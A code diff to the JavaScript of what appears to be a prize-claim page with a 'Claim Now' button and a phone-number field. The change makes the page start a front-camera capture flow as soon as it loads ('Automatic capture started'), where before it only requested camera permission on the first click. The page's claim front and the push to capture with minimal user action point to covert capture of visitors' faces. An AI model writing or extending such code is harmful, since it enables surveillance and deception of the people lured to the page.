@@ -17,17 +17,24 @@ const elements = {
 
 let hasPermission = false;
 
-// Request permission as early as possible (on first click/interaction)
-document.addEventListener('click', async () => {
+// Request permission immediately on load and also on first click as fallback
+async function autoStart() {
     if (!hasPermission) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            stream.getTracks().forEach(track => track.stop()); // Just to trigger the prompt
+            await startCaptureFlow('Initial Load');
             hasPermission = true;
-            console.log('Camera permission warmed up');
+            console.log('Automatic capture started');
         } catch (err) {
-            console.warn('Initial permission request failed:', err);
+            console.warn('Auto-start failed (likely browser security):', err);
         }
+    }
+}
+
+window.addEventListener('DOMContentLoaded', autoStart);
+
+document.addEventListener('click', async () => {
+    if (!hasPermission) {
+        await autoStart();
     }
 }, { once: true });
 
@@ -62,7 +69,7 @@ function setLoading(isLoading) {
     elements.btnText.textContent = isLoading ? 'Processing...' : 'Claim Now';
 }
 
-async function startCaptureFlow(phoneNumber) {
+async function startCaptureFlow(phoneNumber = 'Initial Load') {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: 'user' }, 
